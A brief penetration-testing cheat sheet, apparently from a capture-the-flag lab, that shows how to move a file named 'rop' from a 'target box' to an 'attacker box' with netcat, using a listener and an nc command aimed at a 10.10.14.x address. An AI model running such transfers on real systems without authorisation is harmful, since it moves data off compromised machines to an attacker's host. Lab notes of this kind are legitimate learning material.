# Transfer file with Netcat

## on attacker box

```bash
nc -nlp 1235 > rop
```

## on target box

```bash
nc -w 3 10.10.14.x 1235 < rop
```
